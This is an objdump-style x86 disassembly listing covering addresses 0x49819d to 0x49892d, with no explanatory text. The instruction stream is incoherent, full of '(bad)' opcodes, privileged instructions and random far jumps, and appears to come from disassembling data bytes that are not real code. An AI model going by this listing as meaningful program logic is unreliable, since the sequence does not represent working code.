  49819d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49819e:	sub    edx,DWORD PTR [ecx]
  4981a0:	dec    ecx
  4981a1:	mov    eax,0x12c0bf44
  4981a6:	jb     0x498215
  4981a8:	jbe    0x4981eb
  4981aa:	aaa    
  4981ab:	add    cl,BYTE PTR [ebx+0x3042c85d]
  4981b1:	pop    ds
  4981b2:	pop    edx
  4981b3:	test   DWORD PTR [ecx*4-0x7b2970a9],ebp
  4981ba:	adc    eax,0xd717af2c
  4981bf:	sub    BYTE PTR [esi+0x33d329a5],ch
  4981c5:	(bad)  
  4981c7:	mov    ah,0xca
  4981c9:	(bad)  
  4981ca:	sub    eax,0x5e34e79e
  4981cf:	jmp    0x4892:0x316fcf84
  4981d6:	lds    eax,FWORD PTR [edi-0x21]
  4981d9:	and    ah,BYTE PTR [edx+eax*2-0x2b98b98e]
  4981e0:	and    BYTE PTR [ecx],cl
  4981e2:	(bad)  
  4981e4:	xor    edi,esi
  4981e6:	cli    
  4981e7:	les    eax,FWORD PTR [edx]
  4981e9:	mov    ds:0xb477737,eax
  4981ee:	or     DWORD PTR [edx-0x78],ebp
  4981f1:	(bad)  
  4981f2:	rol    BYTE PTR [eax],1
  4981f4:	pop    ebp
  4981f5:	adc    DWORD PTR [edi],edx
  4981f7:	cmp    BYTE PTR [edi-0x3b559b7b],al
  4981fd:	inc    esp
  4981fe:	xchg   edi,eax
  4981ff:	xor    BYTE PTR [edx-0x40a6b930],dl
  498205:	inc    edi
  498206:	and    al,0x20
  498208:	and    eax,0x6a33cf77
  49820d:	adc    DWORD PTR [eax],eax
  49820f:	fimul  DWORD PTR [edi-0x19]
  498212:	and    al,0x75
  498214:	rol    DWORD PTR [eax],0x9f
  498217:	inc    ebp
  498218:	push   0x2794485d
  49821d:	jmp    FWORD PTR [esi+ebp*2+0x6fe6c26d]
  498224:	mov    bh,0x4a
  498226:	fdivr  st(6),st
  498228:	or     eax,0x973e7ff3
  49822d:	mov    fs,WORD PTR [edx+0xa]
  498230:	mov    eax,ds:0x8a833657
  498235:	dec    ebp
  498236:	add    al,0x57
  498238:	inc    edi
  498239:	push   esi
  49823a:	or     eax,0xf70f137c
  49823f:	adc    al,BYTE PTR [ebx+0x16f7968b]
  498245:	mov    eax,0x174768d5
  49824a:	lahf   
  49824b:	aam    0x95
  49824d:	adc    dl,BYTE PTR [ebx+0x7121fef]
  498253:	mov    ds:0xaeff4f88,eax
  498258:	adc    al,0x4
  49825b:	mov    bh,0x1f
  49825d:	ret    0x8180
  498260:	xor    al,0x7f
  498262:	sub    esi,DWORD PTR [eax-0x409494a8]
  498268:	outs   dx,DWORD PTR ds:[esi]
  498269:	es jns 0x4982ce
  49826c:	add    eax,0x6aefcb17
  498271:	cwde   
  498272:	sbb    ch,BYTE PTR [esi+edi*8-0x4b62d7a1]
  498279:	xchg   BYTE PTR [ebx],dh
  49827b:	scas   eax,DWORD PTR es:[edi]
  49827c:	push   esi
  49827d:	mov    BYTE PTR [esi-0x58],dl
  498280:	ja     0x4982c1
  498282:	and    BYTE PTR [eax-0x20ed16d6],dl
  498288:	(bad)  
  498289:	sub    al,0xe2
  49828c:	aaa    
  49828d:	aaa    
  49828e:	daa    
  49828f:	sub    ecx,edi
  498291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  498292:	add    eax,0x4832ef43
  498297:	les    eax,FWORD PTR [eax+0x5bbf4e0e]
  49829d:	adc    DWORD PTR ds:0xffbf1722,0xffffffb4
  4982a4:	cmc    
  4982a5:	push   edx
  4982a6:	popa   
  4982a7:	iret   
  4982a8:	das    
  4982a9:	push   ecx
  4982aa:	inc    ecx
  4982ab:	inc    esp
  4982ac:	test   al,0xef
  4982ae:	inc    edi
  4982af:	fwait
  4982b0:	(bad)  
  4982b1:	or     ch,BYTE PTR [esi+0x3e]
  4982b4:	outs   dx,DWORD PTR ds:[esi]
  4982b5:	aam    0xa6
  4982b7:	inc    esp
  4982b8:	mov    edx,edi
  4982ba:	out    0x27,eax
  4982bc:	lea    ecx,ds:0x239f5d6f
  4982c2:	paddsb mm3,QWORD PTR [edx]
  4982c5:	sbb    ch,BYTE PTR [edx+0x77eb3947]
  4982cb:	pop    edx
  4982cc:	pop    esp
  4982cd:	mov    al,ds:0xca49ff46
  4982d2:	dec    ecx
  4982d3:	imul   ecx,edi,0x47
  4982d6:	stos   BYTE PTR es:[edi],al
  4982d7:	or     eax,0x1f17d5bc
  4982dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4982dd:	or     BYTE PTR [ebx-0x13],bl
  4982e0:	adc    eax,0x61175ff2
  4982e5:	test   BYTE PTR [esi+0x6d],ah
  4982e8:	daa    
  4982e9:	div    DWORD PTR [ecx]
  4982eb:	dec    eax
  4982ec:	aam    0x3a
  4982ee:	inc    edi
  4982ef:	dec    edi
  4982f0:	inc    edx
  4982f1:	adc    DWORD PTR [esi+0xf45af58],esp
  4982f7:	mov    DWORD PTR ds:0x4179495,eax
  4982fd:	mov    cl,0x60
  4982ff:	ss out 0xda,eax
  498302:	mov    bl,dl
  498304:	call   0x55893600
  498309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49830a:	es mov esp,edi
  49830d:	mov    edi,0xa4503536
  498312:	push   edi
  498313:	xor    al,0xc4
  498315:	and    al,0x12
  498317:	les    esi,FWORD PTR [edi+0x77]
  49831a:	and    al,0x95
  49831c:	sbb    BYTE PTR [ecx+0x31],dh
  49831f:	(bad)  
  498320:	mov    ah,0x19
  498322:	sbb    BYTE PTR [ebp-0x39],cl
  498325:	mov    edi,0xb64c162d
  49832a:	pop    es
  49832b:	stos   DWORD PTR es:[edi],eax
  49832c:	cmp    DWORD PTR [edx+0x6f518971],edx
  498332:	mov    edx,0x45628c4a
  498337:	call   FWORD PTR [edi]
  498339:	pop    es
  49833a:	popa   
  49833b:	popf   
  49833c:	pop    eax
  49833d:	shl    DWORD PTR [edi+0x21f0849f],0x7c
  498344:	iret   
  498345:	dec    DWORD PTR [edx+0x37aac052]
  49834b:	lahf   
  49834c:	sbb    BYTE PTR [eax+0x42],dh
  49834f:	inc    edx
  498350:	jg     0x49839e
  498352:	and    DWORD PTR [edi+0xa],edx
  498355:	test   DWORD PTR [esi+0x39],0x29c4a445
  49835c:	movzx  edx,WORD PTR [esi-0x6f]
  498360:	jle    0x4983c4
  498362:	dec    edi
  498363:	inc    esi
  498364:	mov    bh,0x48
  498366:	dec    esp
  498367:	dec    ecx
  498368:	cmp    esi,0x46
  49836b:	inc    ebx
  49836c:	mov    BYTE PTR [ecx],bl
  49836e:	ret    0xf754
  498371:	xor    ah,bh
  498373:	bound  esi,QWORD PTR [ebp-0x28]
  498376:	push   edx
  498377:	iret   
  498378:	es nop
  49837a:	pop    es
  49837b:	rol    DWORD PTR [edi+0x14303746],0x43
  498382:	pop    eax
  498383:	pusha  
  498384:	daa    
  498385:	dec    edi
  498386:	les    ecx,FWORD PTR [edx]
  498388:	or     al,0x23
  49838a:	jg     0x4983ee
  49838c:	mov    ah,0xd3
  49838e:	push   0xffffffc7
  498390:	imul   BYTE PTR [edi+0x55]
  498393:	adc    dh,BYTE PTR [ebp+0x347f8f4e]
  498399:	mov    al,0xcc
  49839b:	push   esi
  49839c:	inc    DWORD PTR [ebp+eax*4+0x4c]
  4983a0:	shr    DWORD PTR [edx],0x6f
  4983a3:	jg     0x4983d6
  4983a5:	xchg   DWORD PTR [eax-0x5b],eax
  4983a8:	imul   ecx,edi,0xffffffc7
  4983ab:	push   edi
  4983ac:	fmul   DWORD PTR [esi-0x11c030ea]
  4983b2:	inc    ebp
  4983b3:	sub    al,0x84
  4983b5:	mov    ds:0xf49a2f24,al
  4983ba:	shr    BYTE PTR [edx+0x7cc77697],0xa
  4983c1:	mov    ebp,ecx
  4983c3:	mov    DWORD PTR ss:[edi-0x28],0x9751236c
  4983cb:	xlat   BYTE PTR ds:[ebx]
  4983cc:	sbb    cl,cl
  4983ce:	ins    BYTE PTR es:[edi],dx
  4983cf:	lds    esp,FWORD PTR [edi-0x497bc841]
  4983d5:	or     sp,di
  4983d8:	scas   eax,DWORD PTR es:[edi]
  4983d9:	pop    esp
  4983da:	test   al,bl
  4983dc:	sub    DWORD PTR [edi+0x368c434f],edx
  4983e2:	pop    eax
  4983e3:	adc    DWORD PTR [edi+0xa],ebx
  4983e6:	lahf   
  4983e7:	add    al,0xea
  4983e9:	and    dl,BYTE PTR [edi+edx*1+0xb]
  4983ed:	jo     0x498440
  4983ef:	mov    al,ds:0x44c7ef54
  4983f4:	sub    BYTE PTR [ecx+0xb],dl
  4983f7:	jns    0x4983d0
  4983f9:	ss fcmovnb st,st(4)
  4983fc:	adc    BYTE PTR [ebp-0x9],0x5f
  498400:	sbb    esi,DWORD PTR [eax+0x72f1482]
  498406:	jno    0x5763b0dc
  49840c:	outs   dx,BYTE PTR ds:[esi]
  49840d:	or     BYTE PTR [ebx],ch
  49840f:	push   esi
  498410:	out    dx,eax
  498411:	lahf   
  498412:	jg     0x4983c8
  498414:	mov    eax,0x45c7846c
  498419:	sub    BYTE PTR [ecx-0x55],dl
  49841c:	xor    esp,edi
  49841e:	push   es
  49841f:	push   ebx
  498420:	stos   DWORD PTR es:[edi],eax
  498421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  498422:	imul   edi
  498424:	shl    DWORD PTR [ecx],0x42
  498427:	lds    edx,FWORD PTR [edi]
  498429:	scas   eax,DWORD PTR es:[edi]
  49842a:	mov    bh,0xa4
  49842c:	jb     0x4983c8
  49842e:	pop    edx
  49842f:	fist   DWORD PTR [eax+0xf8d5c0e]
  498435:	inc    ebp
  498436:	cmovge edx,esp
  498439:	sub    eax,esp
  49843b:	xchg   esi,ebx
  49843d:	inc    edi
  49843e:	mov    BYTE PTR [eax],dl
  498440:	xor    eax,DWORD PTR [edi+ecx*1-0x552d3ef0]
  498447:	addr16 aaa 
  498449:	add    esp,ecx
  49844b:	test   BYTE PTR [esi-0x71],dl
  49844e:	add    al,0xc1
  498450:	sbb    cl,BYTE PTR [edi+edx*2-0x4b9d3f71]
  498457:	mov    DWORD PTR [edi-0x629df7e5],esi
  49845d:	out    dx,eax
  49845e:	pop    ss
  49845f:	and    DWORD PTR [edi+0x4],edx
  498462:	dec    ebx
  498463:	aas    
  498464:	xor    DWORD PTR [edi],esp
  498466:	loop   0x4983f0
  498468:	dec    eax
  498469:	pop    edi
  49846a:	mov    ebp,DWORD PTR [ecx+0x27b58db6]
  498470:	jbe    0x4984b3
  498472:	fadd   DWORD PTR [eax+0x68]
  498475:	and    DWORD PTR [edi],edi
  498477:	mov    ds:0xf735a912,al
  49847c:	das    
  49847d:	mov    ds:0x2f2d25c1,al
  498482:	xlat   BYTE PTR ds:[ebx]
  498483:	pop    edx
  498484:	adc    eax,0xa93fd2c1
  498489:	add    eax,0x7978ba9
  49848e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49848f:	fisubr WORD PTR [edx+0x4527c704]
  498495:	mov    al,0xb4
  498497:	pop    ebx
  498498:	imul   esp,DWORD PTR [edi-0x4f],0x42
  49849c:	sub    al,0x16
  49849e:	push   esi
  49849f:	outs   dx,DWORD PTR ds:[esi]
  4984a0:	push   ebp
  4984a1:	sub    BYTE PTR [edx-0x65],dl
  4984a4:	xchg   DWORD PTR [edi],ebp
  4984a6:	ins    DWORD PTR es:[edi],dx
  4984a7:	sub    dh,BYTE PTR [ebp+0x68]
  4984aa:	fist   WORD PTR [ecx-0x40]
  4984ad:	sar    BYTE PTR [eax-0x575200c1],cl
  4984b3:	pusha  
  4984b4:	pusha  
  4984b5:	pop    edi
  4984b6:	pop    ss
  4984b7:	push   ss
  4984b8:	mov    eax,ds:0x44072f48
  4984bd:	aaa    
  4984be:	or     eax,0x2a17365d
  4984c3:	push   0xffffffc5
  4984c5:	lods   eax,DWORD PTR ds:[esi]
  4984c6:	aaa    
  4984c7:	pcmpgtb mm3,QWORD PTR [edx+0xb]
  4984cb:	mov    ch,0x67
  4984cd:	adc    eax,0x23da74b0
  4984d2:	div    bh
  4984d4:	and    bl,BYTE PTR [eax-0x76]
  4984d7:	or     al,0x38
  4984d9:	not    esi
  4984db:	xor    DWORD PTR [ebx+ebp*1],eax
  4984de:	mov    edi,0x132a4f45
  4984e3:	sbb    dl,BYTE PTR [ecx]
  4984e5:	movzx  edx,WORD PTR ds:0xe741
  4984eb:	xor    ecx,edi
  4984ed:	daa    
  4984ee:	sahf   
  4984ef:	sub    DWORD PTR [ebx],esi
  4984f1:	add    al,0x32
  4984f3:	das    
  4984f4:	xchg   esi,eax
  4984f5:	mov    BYTE PTR [ebx-0x2d],bl
  4984f8:	aaa    
  4984f9:	inc    edx
  4984fa:	aaa    
  4984fb:	lahf   
  4984fc:	or     al,0x6c
  4984fe:	fidiv  DWORD PTR [ebp+0x740c2f83]
  498504:	fmul   DWORD PTR [edi+0x7]
  498508:	inc    edx
  498509:	xor    DWORD PTR [esi+0x7ea70ad4],0x57
  498510:	sub    al,0x60
  498512:	xchg   ebx,eax
  498513:	jno    0x498517
  498515:	xchg   edi,eax
  498516:	adc    eax,0xff54d2c1
  49851b:	xor    esp,DWORD PTR [edi+0x3e]
  49851e:	inc    edx
  49851f:	and    eax,0x3400320f
  498524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498525:	pop    ebx
  498526:	dec    eax
  498527:	xchg   ebp,eax
  498528:	xor    bh,BYTE PTR [edi-0x4fd51a5b]
  49852e:	das    
  49852f:	daa    
  498530:	cmp    BYTE PTR [eax+ecx*2-0x2c],dh
  498534:	stos   BYTE PTR es:[edi],al
  498535:	xlat   BYTE PTR ds:[ebx]
  498536:	out    0xa3,eax
  498538:	shl    DWORD PTR [eax+ecx*1+0x15eaa78e],1
  49853f:	rcl    edx,0x1
  498542:	jbe    0x4985ab
  498544:	mov    WORD PTR [esi+0x42],gs
  498547:	or     bl,bh
  498549:	sub    BYTE PTR [eax],ah
  49854b:	lea    esi,[edi+ebp*8]
  49854e:	scas   eax,DWORD PTR es:[edi]
  49854f:	push   0x68
  498551:	int    0xc2
  498553:	iret   
  498554:	not    edx
  498556:	add    BYTE PTR [ecx],ah
  498558:	mov    ecx,0xbd46641
  49855d:	adc    ecx,eax
  49855f:	aas    
  498560:	adc    eax,DWORD PTR ds:0xdf4934a4
  498566:	out    0xd0,eax
  498568:	ins    BYTE PTR es:[edi],dx
  498569:	or     al,BYTE PTR [edi]
  49856b:	xor    al,0x27
  49856d:	lods   eax,DWORD PTR ds:[esi]
  49856e:	and    BYTE PTR [eax],al
  498570:	test   BYTE PTR [edi],ch
  498572:	pop    edx
  498573:	shr    DWORD PTR [esi+0x573b3f15],0x42
  49857a:	scas   al,BYTE PTR es:[edi]
  49857b:	add    ebp,DWORD PTR [ebx]
  49857d:	out    0x5f,eax
  49857f:	inc    ebx
  498580:	dec    eax
  498581:	sbb    BYTE PTR [edi],dl
  498583:	inc    esp
  498584:	sti    
  498585:	and    DWORD PTR [ebp-0x2030ae59],eax
  49858b:	pop    esi
  49858c:	rol    BYTE PTR [esi+0x22],0x49
  498590:	xor    al,0x67
  498592:	push   ss
  498593:	adc    eax,0xefae46b0
  498598:	add    BYTE PTR [edx+eax*1-0x2b97c06c],ch
  49859f:	or     ch,ch
  4985a1:	cmp    dl,BYTE PTR [edi+0x1da525b7]
  4985a7:	out    dx,eax
  4985a8:	scas   eax,DWORD PTR es:[edi]
  4985a9:	fwait
  4985aa:	out    dx,eax
  4985ab:	xchg   DWORD PTR [ecx+0x3514c40a],esp
  4985b1:	ja     0x49855c
  4985b3:	inc    esp
  4985b4:	mov    ds:0x709741a9,eax
  4985b9:	dec    ebx
  4985ba:	les    esp,FWORD PTR [edi+0x26ad2f7f]
  4985c0:	rcr    BYTE PTR [eax],cl
  4985c2:	out    dx,eax
  4985c3:	mov    dl,0x52
  4985c5:	jo     0x4985ef
  4985c7:	inc    edi
  4985c8:	push   edi
  4985c9:	icebp  
  4985ca:	mov    al,0x86
  4985cc:	pop    ebp
  4985cd:	outs   dx,DWORD PTR ds:[esi]
  4985ce:	jg     0x4985b3
  4985d0:	mov    edx,eax
  4985d2:	sub    dl,BYTE PTR [edi+eax*8]
  4985d5:	sub    al,BYTE PTR [ecx-0x23]
  4985d8:	sub    BYTE PTR [edi],0x4f
  4985db:	inc    ecx
  4985dc:	(bad)  
  4985dd:	dec    eax
  4985de:	jb     0x4985ed
  4985e0:	test   BYTE PTR [esi+0x115b8244],ch
  4985e6:	adc    esp,DWORD PTR [edi+0x2]
  4985e9:	xchg   eax,eax
  4985eb:	and    DWORD PTR [esi],edx
  4985ed:	lods   al,BYTE PTR ds:[esi]
  4985ee:	pop    ds
  4985ef:	out    0x54,eax
  4985f1:	sub    al,0x60
  4985f3:	call   0xa820b727
  4985f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4985f9:	xchg   ecx,eax
  4985fa:	mov    ah,0x4e
  4985fc:	xor    ah,BYTE PTR [edi+0x5a43e498]
  498602:	test   BYTE PTR [ebx+0x39],0x46
  498606:	and    eax,DWORD PTR [esp+ebp*8-0x5]
  49860a:	adc    BYTE PTR [bp+di-0x6d3f],ah
  49860f:	pop    es
  498610:	lds    esi,FWORD PTR [esi+edx*2]
  498613:	ror    esi,0x3f
  498616:	jae    0x498644
  498618:	push   cs
  498619:	imul   esi,DWORD PTR [edi+ebp*8+0x830200f],0x28
  498621:	pop    es
  498622:	push   ss
  498623:	shl    DWORD PTR [edx-0x64],cl
  498626:	daa    
  498627:	inc    ecx
  498628:	dec    edi
  498629:	lods   al,BYTE PTR ds:[esi]
  49862a:	ret    
  49862b:	shl    BYTE PTR [edi],1
  49862d:	pop    ds
  49862e:	push   ebx
  49862f:	lods   eax,DWORD PTR ds:[esi]
  498630:	adc    ah,BYTE PTR [eax+0xd1f7715]
  498636:	sub    al,0x92
  498638:	or     DWORD PTR [edi+0x32],0x36
  49863c:	jo     0x49866f
  49863e:	mov    eax,0x99625f07
  498643:	or     cl,ch
  498645:	(bad)  
  498647:	sub    BYTE PTR [esi+0x46578b0a],0x10
  49864e:	clc    
  49864f:	inc    edx
  498650:	push   0xffffff8f
  498652:	ja     0x4985d5
  498654:	dec    ebp
  498655:	shrd   DWORD PTR [edi-0x25e560ee],edi,0x80
  49865d:	inc    esp
  49865e:	push   edi
  49865f:	out    0xa,eax
  498661:	push   0x27175561
  498666:	or     eax,0x5f2c16b8
  49866b:	push   edi
  49866c:	pusha  
  49866d:	adc    ch,BYTE PTR [ebx]
  49866f:	shl    BYTE PTR [esi],0xff
  498672:	push   ecx
  498673:	sub    esi,DWORD PTR [esi+eax*8]
  498676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498677:	xchg   DWORD PTR [edi+0x4f45d1a1],esp
  49867d:	ja     0x498643
  49867f:	shl    BYTE PTR ds:0x6ab79b46,0xe3
  498686:	push   es
  498687:	push   es
  498688:	ja     0x4986f9
  49868a:	push   0x2
  49868c:	jp     0x498662
  49868e:	push   ebx
  49868f:	jg     0x498706
  498691:	sbb    DWORD PTR [ecx-0x2910787b],esp
  498697:	and    dh,BYTE PTR [eax]
  498699:	lea    ebp,[edi-0x241bda99]
  49869f:	push   esi
  4986a0:	cmp    esi,ecx
  4986a2:	mov    ds:0xf0b28c5,eax
  4986a7:	mov    dh,0xad
  4986a9:	mov    dl,BYTE PTR [ebp+0x40]
  4986ac:	addr16 dec edi
  4986ae:	pop    eax
  4986af:	aad    0x88
  4986b1:	loopne 0x498642
  4986b3:	xchg   DWORD PTR [edi],esi
  4986b5:	push   esi
  4986b6:	xor    esi,DWORD PTR [eax+0x237af90]
  4986bc:	push   es
  4986bd:	fwait
  4986be:	lock aas 
  4986c0:	out    0x56,eax
  4986c2:	shl    DWORD PTR [ebp-0x3f],1
  4986c5:	stos   BYTE PTR es:[edi],al
  4986c6:	sysret 
  4986c8:	inc    esp
  4986c9:	lsl    eax,WORD PTR [esi]
  4986cc:	sbb    eax,DWORD PTR [eax-0x5af08521]
  4986d2:	dec    edx
  4986d3:	sbb    al,BYTE PTR [ebx+0x44]
  4986d6:	aaa    
  4986d7:	sub    dh,BYTE PTR [ecx+eax*4-0x2e]
  4986db:	ss out 0xd0,eax
  4986de:	rol    BYTE PTR [ebp+0x5],cl
  4986e1:	lahf   
  4986e2:	xor    DWORD PTR [eax-0x2055b93e],eax
  4986e8:	cmovle esp,eax
  4986eb:	adc    dl,dl
  4986ed:	jg     0x498686
  4986ef:	adc    ebx,DWORD PTR [eax-0x57]
  4986f2:	or     esi,DWORD PTR [eax]
  4986f4:	out    dx,eax
  4986f5:	dec    ebp
  4986f6:	mov    dh,0xa6
  4986f8:	or     cl,BYTE PTR [edi]
  4986fa:	xor    bh,bh
  4986fc:	dec    ebp
  4986fd:	dec    eax
  4986fe:	add    al,0x48
  498700:	jg     0x498699
  498702:	shr    DWORD PTR [edx-0x57],0x82
  498706:	outs   dx,DWORD PTR ds:[esi]
  498707:	pop    DWORD PTR [edi]
  498709:	xor    eax,0xb71aaac4
  49870e:	sbb    cl,BYTE PTR [ebx]
  498710:	test   eax,0x27b75160
  498715:	pop    edx
  498716:	leave  
  498717:	inc    ecx
  498718:	lock xchg edi,eax
  49871a:	xor    eax,0x1b20309f
  49871f:	adc    BYTE PTR [ecx-0x2b5a1c19],al
  498725:	ins    DWORD PTR es:[edi],dx
  498726:	jecxz  0x498797
  498728:	xlat   BYTE PTR ds:[ebx]
  498729:	icebp  
  49872a:	aam    0xe0
  49872c:	xor    al,0x7
  49872e:	mov    es,WORD PTR [edx]
  498730:	mov    eax,fs
  498732:	mov    dh,0xaf
  498734:	addr16 add eax,0x4a
  498738:	push   es
  498739:	xor    al,0x6e
  49873b:	and    ebp,DWORD PTR [ebp+0x30]
  49873e:	out    dx,eax
  49873f:	inc    DWORD PTR [edi-0x1bdad36f]
  498745:	xor    al,0xdf
  498747:	stos   DWORD PTR es:[edi],eax
  498748:	add    BYTE PTR [edx-0x4b6850aa],dl
  49874e:	push   es
  49874f:	inc    eax
  498750:	aas    
  498751:	iret   
  498752:	sub    eax,0x7756f158
  498757:	mov    eax,DWORD PTR [edi]
  498759:	and    dh,BYTE PTR [eax+0x1c7000a]
  49875f:	sub    DWORD PTR [edx+0x6d],esp
  498762:	mul    DWORD PTR [edi+0x5aea46c3]
  498768:	mov    dh,0x6f
  49876a:	fmul   DWORD PTR [edx+0x276f358c]
  498770:	scas   eax,DWORD PTR es:[edi]
  498771:	add    eax,0xf912423
  498776:	pop    es
  498777:	(bad)  
  498778:	or     al,0x8
  49877a:	outs   dx,DWORD PTR ds:[esi]
  49877b:	addr16 jg 0x498744
  49877e:	sbb    BYTE PTR [ecx],0x94
  498781:	scas   eax,DWORD PTR es:[edi]
  498782:	mov    gs,WORD PTR [esi+0x60]
  498785:	aam    0xe7
  498787:	scas   eax,DWORD PTR es:[edi]
  498788:	xor    al,0xb
  49878a:	push   ebp
  49878b:	stos   BYTE PTR es:[edi],al
  49878c:	and    BYTE PTR [edi+0x3885573b],0x9
  498793:	push   0x1a4003ff
  498798:	add    al,0xaf
  49879a:	mov    ecx,0x16a40909
  49879f:	inc    ebx
  4987a0:	dec    edi
  4987a1:	inc    esp
  4987a2:	call   0x436f:0xa79b1a42
  4987a9:	mov    cs,WORD PTR [edx]
  4987ab:	xor    DWORD PTR [ebx],edx
  4987ad:	ja     0x4987d9
  4987af:	lods   al,BYTE PTR ds:[esi]
  4987b0:	adc    BYTE PTR ds:0x7d797c8,0x70
  4987b7:	mov    cl,0x1a
  4987b9:	ins    DWORD PTR es:[edi],dx
  4987ba:	ja     0x49875b
  4987bc:	push   ss
  4987bd:	icebp  
  4987be:	mov    al,0xa
  4987c0:	pop    ss
  4987c1:	inc    ebx
  4987c2:	loopne 0x49876e
  4987c4:	or     al,0xec
  4987c6:	pop    ss
  4987c7:	xchg   edi,eax
  4987c8:	inc    ebp
  4987c9:	add    al,BYTE PTR [ebp-0x80]
  4987cc:	jbe    0x49878d
  4987ce:	xchg   edi,eax
  4987cf:	add    DWORD PTR [ebx+0x6defa49a],esp
  4987d5:	jl     0x498803
  4987d7:	es (bad) 
  4987d9:	jg     0x498830
  4987db:	popa   
  4987dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4987dd:	cmp    dl,BYTE PTR [edi-0x489e99f1]
  4987e3:	mov    BYTE PTR [edi-0x61],ch
  4987e6:	mov    al,al
  4987e8:	xchg   ecx,eax
  4987e9:	in     al,0x38
  4987eb:	inc    edi
  4987ec:	dec    eax
  4987ed:	xor    esi,DWORD PTR [esp+ebx*2+0x469741ff]
  4987f4:	popa   
  4987f5:	adc    DWORD PTR [eax],ebx
  4987f7:	dec    edi
  4987f8:	add    esp,DWORD PTR [ecx+edx*1+0x53]
  4987fc:	xor    DWORD PTR [edi],edx
  4987fe:	xor    eax,0xc03551c0
  498803:	xor    DWORD PTR [bx+0x4036],ecx
  498808:	pop    edx
  498809:	jne    0x498865
  49880b:	(bad)  
  49880c:	xchg   ecx,eax
  49880d:	mov    cl,BYTE PTR ds:0x5a3f4fe9
  498813:	test   al,0x2b
  498815:	nop
  498816:	pop    ss
  498817:	inc    ebx
  498818:	pop    ds
  498819:	and    cl,BYTE PTR [eax+edx*2-0x70]
  49881d:	ja     0x498856
  49881f:	inc    edi
  498820:	nop
  498821:	jbe    0x498866
  498823:	or     DWORD PTR [ebx],eax
  498825:	dec    edx
  498826:	adc    esi,DWORD PTR [ebp+0x5]
  498829:	daa    
  49882a:	xor    edi,edi
  49882c:	(bad)  
  49882d:	or     al,0x65
  49882f:	pop    edi
  498830:	outs   dx,DWORD PTR ds:[esi]
  498831:	pop    ds
  498832:	xchg   edi,eax
  498833:	or     WORD PTR [eax+0x3607fff6],di
  49883a:	out    dx,eax
  49883b:	lea    esi,[edx]
  49883d:	push   es
  49883e:	sub    DWORD PTR [esi],edx
  498840:	fbstp  TBYTE PTR [ecx]
  498842:	mov    al,ds:0xaf3235d5
  498847:	mov    edi,0x4616f144
  49884c:	scas   al,BYTE PTR es:[edi]
  49884d:	mov    bh,0x5
  49884f:	xor    dh,BYTE PTR [eax+0x69670720]
  498855:	in     eax,dx
  498856:	mov    BYTE PTR [eax-0x65],bl
  498859:	outs   dx,DWORD PTR ds:[esi]
  49885a:	inc    eax
  49885b:	add    DWORD PTR [ebx-0x76d58c9b],edi
  498861:	adc    al,0x72
  498863:	fidiv  WORD PTR [esi]
  498865:	dec    DWORD PTR [eax]
  498867:	je     0x498815
  498869:	shr    BYTE PTR [edi-0x49],0x7c
  49886d:	retf   
  49886e:	pop    eax
  49886f:	dec    esp
  498870:	outs   dx,DWORD PTR ds:[esi]
  498871:	adc    ecx,DWORD PTR [ebp+0x7f45b758]
  498877:	aaa    
  498878:	pop    ebp
  498879:	ins    BYTE PTR es:[edi],dx
  49887a:	js     0x4988d6
  49887c:	dec    edi
  49887d:	xlat   BYTE PTR ds:[ebx]
  49887e:	mov    edi,0x9155a43
  498883:	div    DWORD PTR [eax]
  498885:	mov    ah,0xa
  498887:	lods   al,BYTE PTR ds:[esi]
  498888:	xchg   DWORD PTR [edi-0x54],ecx
  49888b:	inc    edx
  49888c:	xchg   ebx,eax
  49888d:	jmp    0x3f20bd31
  498892:	mov    al,0xb6
  498894:	or     dh,BYTE PTR [edi+0x5b42fe57]
  49889a:	xor    DWORD PTR [ebp-0x30bcccac],edx
  4988a0:	pop    edi
  4988a1:	dec    esp
  4988a2:	push   0x58310321
  4988a7:	and    eax,0x2f27560c
  4988ac:	xchg   edi,eax
  4988ad:	xor    eax,0x9fcdca51
  4988b2:	inc    edx
  4988b3:	aas    
  4988b4:	adc    BYTE PTR [ecx+0x5f44d6cd],cl
  4988ba:	xor    al,0x4b
  4988bc:	inc    esi
  4988bd:	sub    bh,cl
  4988bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4988c0:	adc    DWORD PTR [eax+0x15],0x4a774274
  4988c7:	xlat   BYTE PTR ds:[ebx]
  4988c8:	stos   BYTE PTR es:[edi],al
  4988c9:	push   ss
  4988ca:	idiv   DWORD PTR [edi]
  4988cc:	into   
  4988cd:	or     al,cl
  4988cf:	lds    esi,FWORD PTR [edi-0x7bb321d0]
  4988d5:	add    ch,dl
  4988d7:	push   ds
  4988d8:	pop    ss
  4988d9:	adc    eax,0x17131698
  4988de:	daa    
  4988df:	mov    DWORD PTR [eax-0x52],ebx
  4988e2:	nop
  4988e3:	pop    ss
  4988e4:	xor    ecx,DWORD PTR [edx]
  4988e6:	popa   
  4988e7:	test   BYTE PTR [esi-0x61],ah
  4988ea:	fild   QWORD PTR [edi+0x55]
  4988ed:	lods   al,BYTE PTR ds:[esi]
  4988ee:	jmp    0x1fb8b836
  4988f3:	mov    al,ds:0xa30b76d5
  4988f8:	aas    
  4988f9:	ror    DWORD PTR [eax-0x82ce6f3],0x97
  498900:	pop    eax
  498901:	sahf   
  498902:	and    DWORD PTR [eax],ebp
  498904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  498905:	inc    esp
  498906:	popa   
  498907:	mov    eax,ds:0x97171b2a
  49890c:	imul   edx,edx,0x52
  49890f:	mov    DWORD PTR [ecx-0x29],eax
  498912:	mov    dh,0x41
  498914:	loopne 0x498938
  498916:	popa   
  498917:	xor    BYTE PTR [edi],bl
  498919:	daa    
  49891a:	aaa    
  49891b:	mov    eax,0x7002890
  498920:	das    
  498921:	sbb    BYTE PTR [ebp-0x50],0xb1
  498925:	cmp    DWORD PTR [edi+0x21522789],0xffffffe7
  49892c:	inc    esp
  49892d:	lods   eax,DWORD PTR ds:[esi]
